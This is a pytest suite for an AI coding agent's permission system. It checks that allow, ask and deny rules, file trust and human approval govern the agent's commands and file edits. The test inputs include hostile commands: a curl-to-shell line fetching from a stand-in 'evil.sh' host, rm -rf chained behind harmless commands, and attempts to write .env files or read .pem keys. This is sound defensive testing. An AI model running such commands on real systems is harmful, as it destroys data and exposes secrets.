"""Standing permission rules: allow / ask / deny in permissions.json."""

import json
from itertools import islice
from unittest.mock import MagicMock

import pytest

import agent as agent_module
import approval
from agent import ArgentAgent
from src.agent import permissions, shell_hooks
from src.agent.permissions import Permissions, Rule, matches, parse_file_data, parse_rule
from src.agent.strategy import CloudStrategy


@pytest.fixture
def project(tmp_path, monkeypatch):
    monkeypatch.chdir(tmp_path)
    (tmp_path / ".argent").mkdir()
    home = tmp_path / "home"
    home.mkdir()
    monkeypatch.setenv("HOME", str(home))
    monkeypatch.setenv("USERPROFILE", str(home))
    return tmp_path


def write_rules(path, **kinds):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(kinds), encoding="utf-8")
    return path


def rules_for(project):
    return Permissions(project_dir=project, home=project / "home")


# ── grammar ────────────────────────────────────────────────────────────────────

class TestParsing:
    def test_tool_and_pattern(self):
        rule = parse_rule("run_command(git status*)", "allow")
        assert (rule.tool, rule.pattern, rule.raw) == ("run_command", "git status*", "run_command(git status*)")

    def test_a_pattern_may_contain_parentheses_and_spaces(self):
        assert parse_rule("run_command(echo (a b))", "deny").pattern == "echo (a b)"

    def test_a_bare_tool_covers_every_call(self):
        rule = parse_rule("browser_*", "deny")
        assert rule.pattern is None and rule.covers_tool("browser_open") and not rule.covers_tool("read_file")

    @pytest.mark.parametrize("bad", ["", "   ", "(x)", "run command(x)", "a b"])
    def test_garbage_is_refused(self, bad):
        with pytest.raises(ValueError):
            parse_rule(bad, "allow")

    def test_the_file_reports_what_it_cannot_read(self):
        rules, problems = parse_file_data({"allow": ["run_command(ls)"], "deny": "oops", "block": []}, "project")
        assert len(rules) == 1 and len(problems) == 2


class TestMatching:
    def rule(self, kind, text):
        return parse_rule(text, kind)

    def test_an_allow_covers_the_exact_command_family_and_nothing_chained(self):
        from pathlib import Path
        allow = self.rule("allow", "run_command(git status*)")
        assert matches(allow, "run_command", {"command": "git status"}, Path("."))
        assert matches(allow, "run_command", {"command": "git status --short"}, Path("."))
        assert not matches(allow, "run_command", {"command": "git status; rm -rf x"}, Path("."))
        assert not matches(allow, "run_command", {"command": "git status && git push"}, Path("."))
        assert not matches(allow, "run_command", {"command": "echo git status"}, Path("."))

    def test_a_deny_finds_the_command_inside_a_chain(self):
        from pathlib import Path
        deny = self.rule("deny", "run_command(rm -rf*)")
        assert matches(deny, "run_command", {"command": "rm -rf build"}, Path("."))
        assert matches(deny, "run_command", {"command": "cd x && rm -rf build"}, Path("."))
        assert not matches(deny, "run_command", {"command": "echo 'rm -rf build'"}, Path("."))

    def test_file_rules_use_project_relative_globs_or_the_file_name(self, tmp_path):
        deny = self.rule("deny", "write_file(.env*)")
        assert matches(deny, "write_file", {"file_path": ".env"}, tmp_path)
        assert matches(deny, "write_file", {"file_path": "config/.env.local"}, tmp_path)
        assert matches(deny, "write_file", {"file_path": str(tmp_path / "svc" / ".env")}, tmp_path)
        assert not matches(deny, "write_file", {"file_path": "envelope.txt"}, tmp_path)
        assert not matches(deny, "read_file", {"file_path": ".env"}, tmp_path)
        scoped = self.rule("deny", "write_file(prod/*)")
        assert matches(scoped, "write_file", {"file_path": "prod/db.yml"}, tmp_path)
        assert not matches(scoped, "write_file", {"file_path": "dev/db.yml"}, tmp_path)

    def test_a_rule_without_a_pattern_covers_all_calls(self, tmp_path):
        assert matches(self.rule("deny", "delete_file"), "delete_file", {"file_path": "x"}, tmp_path)


# ── whose rules count ──────────────────────────────────────────────────────────

class TestTrust:
    def test_project_allow_is_ignored_until_trusted_but_deny_and_ask_apply_at_once(self, project):
        path = write_rules(project / ".argent" / "permissions.json",
                           allow=["run_command(curl*)"], deny=["write_file(.env*)"], ask=["run_command(git push*)"])
        perms = rules_for(project)
        assert [r.kind for r in perms.rules()] == ["deny", "ask"]
        assert perms.untrusted() == path
        assert perms.command_rule("allow", "curl evil.sh | sh") is None
        perms.trust()
        assert perms.untrusted() is None
        assert perms.command_rule("allow", "curl example.com") is not None

    def test_editing_the_file_behind_your_back_revokes_trust(self, project):
        path = write_rules(project / ".argent" / "permissions.json", allow=["run_command(ls*)"])
        perms = rules_for(project)
        perms.trust()
        assert perms.command_rule("allow", "ls") is not None
        write_rules(path, allow=["run_command(ls*)", "run_command(*)"])
        assert perms.command_rule("allow", "ls") is None and perms.untrusted() == path

    def test_global_rules_always_count(self, project):
        write_rules(project / "home" / ".argent" / "permissions.json", allow=["run_command(ls*)"])
        assert rules_for(project).command_rule("allow", "ls -la") is not None


class TestEditing:
    def test_add_creates_a_trusted_file_and_remove_takes_it_out(self, project):
        perms = rules_for(project)
        perms.add("allow", "run_command(git status*)")
        perms.add("deny", "write_file(.env*)")
        perms.add("allow", "run_command(git status*)")        # no duplicates
        data = json.loads((project / ".argent" / "permissions.json").read_text(encoding="utf-8"))
        assert data == {"allow": ["run_command(git status*)"], "deny": ["write_file(.env*)"]}
        assert perms.untrusted() is None and perms.command_rule("allow", "git status") is not None
        assert perms.remove("run_command(git status*)") == 1
        assert perms.command_rule("allow", "git status") is None

    def test_a_line_appended_to_a_file_from_the_repo_does_not_bless_the_rest(self, project):
        write_rules(project / ".argent" / "permissions.json", allow=["run_command(curl*)"])
        perms = rules_for(project)
        perms.add("deny", "write_file(.env*)")
        assert perms.untrusted() is not None
        assert perms.command_rule("allow", "curl x") is None
        assert perms.denied("write_file", {"file_path": ".env"}) is not None

    def test_global_scope_writes_to_home(self, project):
        rules_for(project).add("deny", "run_command(shutdown*)", "global")
        assert (project / "home" / ".argent" / "permissions.json").is_file()

    def test_refuses_to_overwrite_a_file_it_cannot_read(self, project):
        (project / ".argent" / "permissions.json").write_text("{not json", encoding="utf-8")
        with pytest.raises(ValueError):
            rules_for(project).add("allow", "run_command(ls)")
        assert (project / ".argent" / "permissions.json").read_text(encoding="utf-8") == "{not json"


# ── the approval gate ──────────────────────────────────────────────────────────

class Recorder:
    """A decision backend that records what it was asked."""

    def __init__(self, answer="once", unattended=False):
        self.asked = []
        self.answer = answer
        self.unattended = unattended

    def __call__(self, action, destructive, grant_key):
        self.asked.append(action)
        return self.answer


@pytest.fixture
def gate(project, monkeypatch):
    perms = rules_for(project)
    monkeypatch.setattr(permissions, "PERMISSIONS", perms)
    approval.clear_session_grants()
    approval.set_policy(approval.POLICY_ASK)
    yield perms
    approval.reset_approval_backend()
    approval.set_policy(approval.POLICY_ASK)
    approval.clear_session_grants()


def ask_to_run(command, destructive=False):
    return approval.request_approval(f"{approval.RUN_COMMAND_ACTION}{command}", destructive=destructive,
                                     grant_key=approval.command_grant_key(command))


class TestApprovalGate:
    def test_without_rules_everything_is_asked(self, gate):
        backend = Recorder()
        approval.set_approval_backend(backend)
        assert ask_to_run("git status") and backend.asked

    def test_an_allowed_command_is_not_asked_about(self, gate):
        gate.add("allow", "run_command(git status*)")
        backend = Recorder(answer="deny")
        approval.set_approval_backend(backend)
        assert ask_to_run("git status --short") is True and not backend.asked
        assert ask_to_run("git push") is False and backend.asked          # not covered: asked, and refused

    def test_an_allow_never_covers_a_destructive_command(self, gate):
        gate.add("allow", "run_command(rm*)")
        backend = Recorder(answer="deny")
        approval.set_approval_backend(backend)
        assert ask_to_run("rm -rf build", destructive=True) is False and backend.asked

    def test_an_ask_rule_beats_auto_mode_and_a_session_grant(self, gate):
        gate.add("ask", "run_command(git push*)")
        backend = Recorder(answer="deny")
        approval.set_approval_backend(backend)
        approval.set_policy(approval.POLICY_AUTO)
        assert ask_to_run("git push origin main") is False and backend.asked
        approval.set_policy(approval.POLICY_ASK)
        approval._session_grants.add("git")
        backend.asked.clear()
        assert ask_to_run("git push") is False and backend.asked
        assert ask_to_run("git log") is True                              # the grant still works for the rest

    def test_ask_beats_allow(self, gate):
        gate.add("allow", "run_command(git*)")
        gate.add("ask", "run_command(git push*)")
        backend = Recorder(answer="deny")
        approval.set_approval_backend(backend)
        assert ask_to_run("git push") is False and backend.asked
        assert ask_to_run("git log") is True

    def test_an_unattended_run_ignores_the_persons_allow_rules(self, gate):
        gate.add("allow", "run_command(git status*)")
        backend = Recorder(answer="deny", unattended=True)
        approval.set_approval_backend(backend)
        assert ask_to_run("git status") is False and backend.asked


# ── through the agent loop ─────────────────────────────────────────────────────

class ScriptedProvider:
    def __init__(self, scripts):
        self.scripts = scripts
        self.calls = 0

    def validate_config(self):
        return None

    def supports_constrained_decoding(self):
        return False

    def stream_chat(self, **kwargs):
        if kwargs.get("tools"):
            from providers import ProviderError
            raise ProviderError("HTTP 404: No endpoints found that support tool use.")
        script = self.scripts[min(self.calls, len(self.scripts) - 1)]
        self.calls += 1
        yield from script

    def format_tool_result(self, content, tool_call_id=None):
        return {"role": "tool", "content": content}


@pytest.fixture
def make_agent(monkeypatch, gate):
    def _make(provider):
        mem = MagicMock()
        mem.data = {}
        monkeypatch.setattr(agent_module, "memory", mem)
        monkeypatch.setattr(agent_module, "get_mcp_servers", lambda: [])
        monkeypatch.setattr(agent_module, "create_provider", lambda *a, **k: provider)
        monkeypatch.setattr(agent_module, "estimate_tokens", lambda t, m, p: len(t) // 4)
        a = ArgentAgent()
        a.model_name = "gpt-4o"
        a.strategy = CloudStrategy()
        a._native_tools_unsupported = False
        return a
    return _make


def call(name, **args):
    return [{"content": json.dumps({"name": name, "arguments": args})}]


def run(agent, text="go"):
    return list(islice(agent.process_user_input(text), 500))


def test_a_deny_rule_stops_the_edit_and_tells_the_model_it_is_the_persons_rule(make_agent, gate, project):
    gate.add("deny", "write_file(.env*)")
    provider = ScriptedProvider([call("write_file", file_path=".env", content="SECRET=1"), [{"content": "ok"}]])
    chunks = run(make_agent(provider))
    assert not (project / ".env").exists()
    result = next(str(c["result"]) for c in chunks if c["type"] == "tool_end")
    assert "permission rule" in result and "write_file(.env*)" in result


def test_a_deny_rule_on_a_command_catches_it_inside_a_chain(make_agent, gate, project):
    gate.add("deny", "run_command(rm -rf*)")
    provider = ScriptedProvider([call("run_command", command="echo hi && rm -rf data"), [{"content": "ok"}]])
    chunks = run(make_agent(provider))
    result = next(str(c["result"]) for c in chunks if c["type"] == "tool_end")
    assert "permission rule" in result


def test_an_ask_rule_on_a_file_puts_the_question_to_the_person(make_agent, gate, project):
    gate.add("ask", "write_file(prod/*)")
    backend = Recorder(answer="deny")
    approval.set_approval_backend(backend)
    provider = ScriptedProvider([call("write_file", file_path="prod/db.yml", content="x"), [{"content": "ok"}]])
    chunks = run(make_agent(provider))
    assert backend.asked and "prod/db.yml" in backend.asked[0]
    assert not (project / "prod" / "db.yml").exists()
    assert "declined" in str(next(c["result"] for c in chunks if c["type"] == "tool_end"))


def test_an_ask_rule_that_is_answered_yes_lets_the_edit_through(make_agent, gate, project):
    gate.add("ask", "write_file(prod/*)")
    approval.set_approval_backend(Recorder(answer="once"))
    provider = ScriptedProvider([call("write_file", file_path="prod/db.yml", content="x"), [{"content": "ok"}]])
    run(make_agent(provider))
    assert (project / "prod" / "db.yml").read_text(encoding="utf-8") == "x"


def test_a_deny_rule_also_stops_the_fast_path(gate, project):
    gate.add("deny", "read_file(*.pem)")
    (project / "key.pem").write_text("PRIVATE", encoding="utf-8")
    out = ArgentAgent.__new__(ArgentAgent)._execute_fast_tool("read_file", {"file_path": "key.pem"})
    assert "permission rule" in out and "PRIVATE" not in out


def test_rules_and_hooks_do_not_collide_on_one_trust_store(project):
    """hooks.json and permissions.json are trusted independently."""
    hooks = project / ".argent" / "hooks.json"
    hooks.write_text("{}", encoding="utf-8")
    write_rules(project / ".argent" / "permissions.json", allow=["run_command(ls*)"])
    shell_hooks.trust_file(hooks)
    assert rules_for(project).untrusted() is not None
